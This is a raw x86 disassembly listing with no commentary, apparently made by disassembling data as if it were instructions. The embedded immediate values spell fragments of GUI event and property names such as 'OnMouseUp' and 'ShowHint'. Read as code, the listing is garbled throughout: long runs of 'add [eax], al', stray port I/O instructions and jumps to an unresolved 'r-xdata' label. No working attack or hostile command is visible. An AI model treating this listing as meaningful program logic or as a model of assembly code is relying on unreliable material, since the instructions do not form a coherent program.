add [ eax + 0x430b0017 ] al
add bh bh
mov eax 0xc8004404
add al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
adc [ edx ] eax
add bh bh
cmp al 0x69
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
pushfd
retn 0x43
outsb
cwde
mov bl 0x43
add [ ebp ] bl
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov ah 0x43
sub_43320b
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070030 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
mov esp 0x80043b8
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
dec esp
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
jo r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0b00
jb r-xdata
loopne r-xdata
jns r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
mov eax 0x1180043
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
outsb
inc ebp
outsb
inc esp
jb r-xdata
mov eax 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
mov bh 0x43
add al bl
add [ eax + 0x4f070037 ] al
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jns r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003a ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or cl [ edi + 0x6e ]
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
js r-xdata
loopne r-xdata
jo r-xdata
mov dh 0x43
push eax
mov bh 0x43
add al ah
add [ eax ] eax
jmp eax
popad
inc esp
jb r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
jb r-xdata
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
dec edi
outsb
push ebx
je r-xdata
sub [ esi + 0xe00043 ] dh
add bh bh
add [ eax ] al
jmp eax
add al 0xb7
inc ebx
add al ch
add [ eax ] eax
jns r-xdata
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add al bl
mov dh 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
dec ebp
outsd
jne r-xdata
jns r-xdata
jo r-xdata
je r-xdata
add al 0x52
arpl [ eax ] ax
mov eax eax
loopne r-xdata
ja r-xdata
push ebx
jb r-xdata
add [ eax ] eax
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
push ebp
jo r-xdata
arpl [ ebx + 0x74 ] bp
mov eax 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ebx ] cl
inc esp
outsd
ja r-xdata
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push eax
mov ebp 0x1300043
mov bh 0x43
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
jb r-xdata
dec ecx
outsb
je r-xdata
inc ebx
jb r-xdata
je r-xdata
jb r-xdata
je r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
add [ ebx + 0x4334e0c0 ] cl
inc esp
jb r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
outsb
js r-xdata
mov edx 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
add [ eax ] al
mov al [ 0xffffffffd80043b6 ]
add [ eax ] ch
inc ebx
add [ esp + eax - 0xc2bffbe ] bl
inc ebx
add ah ch
add eax [ edx ]
add [ edx + eax * 2 ] 0x0
aam 0x4
inc edx
add [ edx + esi * 8 ] dl
inc ebx
add [ ecx + esi * 2 - 0xd77ffbd ] ch
inc ebx
add ah dh
leave
inc esp
add al cl
sub [ eax + eax ] al
hlt
jb r-xdata
outsb
je r-xdata
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
add [ eax ] al
xor al [ eax ]
xor al 0x4
jb r-xdata
inc edx
add [ eax + 0x68004371 ] cl
add al 0x42
add [ eax ] al
add [ ecx + eax * 8 + 0x34940043 ] bh
inc eax
jb r-xdata
ja r-xdata
insd
inc ebp
jbe r-xdata
add [ eax - 0x5bffbfcc ] ah
inc esp
enter 0x43 0x54
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
test [ 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
add [ eax + ecx * 8 + 0x43 ] al
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] cl
lea eax [ bx + si ]
jo r-xdata
outsd
jb r-xdata
pop es
jb r-xdata
inc eax
add [ eax + eax ] ch
add [ eax ] al
mov esp 0x940043c1
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
dec ecx
je r-xdata
je r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
add [ esi ] eax
outsb
jb r-xdata
add eax 0x74617453
andps xmm1 [ gs : edi + 0x77 ]
inc esp
outsd
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
add al 0x8
pop es
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ esi ] dh
inc ebx
outsb
je r-xdata
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
xor al 0x40
movsb [ edi ] [ esi ]
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ esp + eax ] dh
inc eax
outsd
in al 0x31
insb
add [ 0x65646e49 ] al
js r-xdata
sub_43378c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_437ad5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x25ffbcc8 ] ch
cmp [ ebx ] al
sbb [ edx ] al
add [ eax ] al
adc al 0x36
inc ebx
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax + 0x24004034 ] ch
inc edi
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah bh
sub [ eax + eax - 0x4 ] eax
jbe r-xdata
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
add ah ch
inc esp
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0x3c004203
je r-xdata
je r-xdata
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add ah ch
jb r-xdata
inc esp
add [ ebx + esi * 2 ] dl
inc ebx
add [ eax ] dl
jb r-xdata
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
les esi [ ebx + eax * 2 + 0x6100 ]
add [ edi ] al
push esp
inc edx
jne r-xdata
mov eax eax
call 0x7437c21
add [ eax ] dl
jae r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ eax + 0x75 ] dl
inc ebx
add [ edi + 0x758c0044 ] dh
inc ebx
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
add al 0x78
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add dh bh
call sub_437d5e
add [ eax ] al
add [ eax ] 0x0
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax ] cl
inc edx
je r-xdata
pop es
inc ebx
add [ edi ] al
add al cl
je r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
push [ eax ]
outsb
add [ eax + 0x4208000d ] al
outsb
aam 0x37
inc ebx
add [ edi + esi + 0x43 ] bl
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
push esp
inc edx
jne r-xdata
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
[ esi * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
add bh bh
cwde
sub [ eax + eax + 0x1 ] al
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
insb
mov ah 0x43
add ah al
add eax [ eax + eax - 0xc ]
add eax [ eax + eax - 0x40 ]
and eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
je r-xdata
dec eax
add [ eax ] dl
je r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
lodsd [ esi ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
[ eax ]
test [ ebx ] sub_43f7b4
add [ eax ] al
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
popad
add [ eax ] al
add [ eax + 0x3c00418d ] dl
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
jae r-xdata
add bh bh
mov eax 0xc8004404
add al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
or dl [ eax + 0x61 ]
jb r-xdata
lodsd [ esi ]
inc ebx
add [ edx + eax ] dl
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ ebx ] cl
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
outsb
cwde
mov bl 0x43
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
mov ah 0x43
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax - 0x80000000 ] al
sbb al 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
dec eax
insb
je r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
sub [ ebp + 0x44 ] 0x0
add [ esi + 0x44 ] ch
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add bh bh
jl r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
push edi
in al 0x2
inc esp
add [ eax + 0x24 ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jo r-xdata
adc [ eax ] al
0x38ff0000 0x4405
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
outsd
inc esp
add [ ecx ] al
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
[ eax ]
outsb
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
je r-xdata
dec ebx
jns r-xdata
dec esp
jns r-xdata
jo r-xdata
inc ebx
add al ch
add [ eax ] al
jns r-xdata
adc [ eax ] al
push edi
add [ eax ] al
jmp esp
adc [ eax ] al
cdq
add [ eax ] al
call [ eax + 0x4dc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001c ] al
push 0x6948776f
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
insd
inc esp
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
mov bh 0x43
add al bl
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
mov bh 0x43
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
sub [ ebx + eax * 2 ] dh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
outsb
inc esp
mov ah 0x43
add [ eax + 0x446d ] al
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
hlt
loopne r-xdata
jo r-xdata
mov dh 0x43
push eax
mov bh 0x43
add al ah
add [ eax ] eax
jmp eax
jns r-xdata
jb r-xdata
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
mov eax 0x1180043
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add al bl
mov dh 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
jb r-xdata
loopne r-xdata
jns r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
push ebp
push ebp
jo r-xdata
arpl [ ebx + 0x74 ] bp
mov eax 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002a ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
outsb
inc ebp
js r-xdata
mov eax 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0900
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
inc esp
jb r-xdata
mov eax 0xe80043
add bh bh
call 0x2423c69
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0023 ] al
outsb
inc esp
jns r-xdata
push 0x656b6365
or [ fs : ebx + 0x62 ] ah
mov edx 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
add [ eax ] al
inc eax
inc ebx
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
mov al [ 0xffffffffd80043b6 ]
add [ eax ] al
add [ eax ] al
add ah al
aas
je r-xdata
push ebx
je r-xdata
dec edi
outsb
sub [ esi + 0xe00043 ] dh
add bh bh
add [ eax ] al
jmp eax
add al 0xb7
inc ebx
add al ch
add [ eax ] eax
jns r-xdata
je r-xdata
inc esp
add [ ebx + esi * 2 ] dl
inc ebx
add [ eax ] dl
jb r-xdata
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
and [ esp + eax * 2 ] 0x0
xchg esp eax
or [ fs : ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edi
jb r-xdata
or [ fs : ebx + 0x62 ] ah
jb r-xdata
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
add ah ch
inc esp
add [ eax ] al
adc al 0x36
adc al 0x2
inc esp
jb r-xdata
inc ebx
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
add [ esi + esi ] dl
je r-xdata
add [ eax ] eax
jmp r-xdata
add [ edi + 0x79480044 ] dh
inc ebx
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
add [ edx ] al
inc eax
add [ edx ] al
push 0x78004203
ja r-xdata
insb
jae r-xdata
inc eax
add al dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
inc ebx
add dl ch
aas
inc ebx
add [ edx + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edi [ edi ]
pop esp
inc ebx
add [ ebx ] al
push cs
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
cld
inc ecx
add [ eax + 0x24004034 ] ch
inc edi
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah bh
sub [ eax + eax - 0x4 ] eax
jbe r-xdata
add eax [ edx ]
mov al [ 0xffffffff9c004034 ]
outsb
arpl [ eax + 0x65 ] bp
arpl [ ebx + 0x65 ] bp
or [ fs : ebx + 0x62 ] esp
inc ebx
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x3e ] bl
inc ebx
add [ ebx ] cl
arpl [ edx + 0x55 ] sp
dec edx
push [ ecx + edi * 2 + 0x43 ]
push 0x426b6365
outsd
js r-xdata
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ eax + edi * 2 + 0x43 ] ah
add [ eax + edi * 2 + 0x78100043 ] al
inc ebx
add [ esi ] al
add [ 0x6b01000 ] al
mov al 0x11
mov ebp 0xffcaffeb
je r-xdata
outsd
je r-xdata
add [ edx + edi * 2 ] ch
inc ebx
add [ eax + 0x78 ] dl
inc ebx
add ah ah
ja r-xdata
inc esp
add ah ch
js r-xdata
rol [ eax ] 0x40
inc ebx
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41 ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41 ] ch
inc ebx
add [ eax ] bl
add [ eax - 0x6fffbc87 ] cl
jns r-xdata
inc ebx
jbe r-xdata
cld
insb
jae r-xdata
add bh bh
sbb [ esi + 0x44 ] ch
add [ edi ] cl
push esp
inc ebx
jne r-xdata
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah bh
sub [ eax + eax - 0x4 ] eax
add [ esp + edi * 8 + 0x34a80041 ] bl
inc eax
add [ edi + eax * 2 ] ah
outsd
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
add ah ch
inc esp
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0x78004203
ja r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0x6e18ff00 ] ah
inc esp
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
[ eax ]
outsb
inc eax
inc ebx
add [ eax ] al
add al [ eax ]
add [ esi + edi + 0x3480043 ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x18004341
je r-xdata
push esp
inc ebx
jne r-xdata
inc ebx
add [ edi + esi + 0x43 ] bl
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
mov eax eax
js r-xdata
add [ edi + 0x79480044 ] dh
inc ebx
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
inc esp
add [ ebx + esi * 2 ] dl
inc ebx
add [ eax ] dl
jb r-xdata
add [ eax ] al
insd
inc ebx
xor al 0x40
je r-xdata
outsd
outsb
fdiv [ edi + 0x41 ]
add [ eax ] dl
add al [ eax ]
push [ eax + 0x78 ]
inc ebx
inc ebx
add [ eax + 0x3c00418d ] dl
add [ eax ] al
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ eax + edi * 2 + 0x43 ] ah
add [ eax + edi * 2 + 0x78100043 ] al
inc ebx
add [ ecx ] cl
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax + 0x24004034 ] ch
inc edi
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
outsd
insb
jb r-xdata
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
inc esp
add ah ch
js r-xdata
cwde
inc esp
add [ eax + 0x1800446a ] bh
inc eax
inc ebx
add ah bh
aas
inc ebx
add [ esi ] dh
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ ebp + eax + 0x4580044 ] ch
add [ edi ] al
or [ ebx + eax * 2 + 0x68 ] edx
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
sar [ eax + 0x41 ] 0x43
insd
inc esp
add [ eax + 0x6d ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050015 ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
popad
jo r-xdata
add [ edi ] al
inc ebx
jns r-xdata
push cs
add [ ebx ] cl
inc ecx
insb
insb
outsd
ja r-xdata
inc ebx
je r-xdata
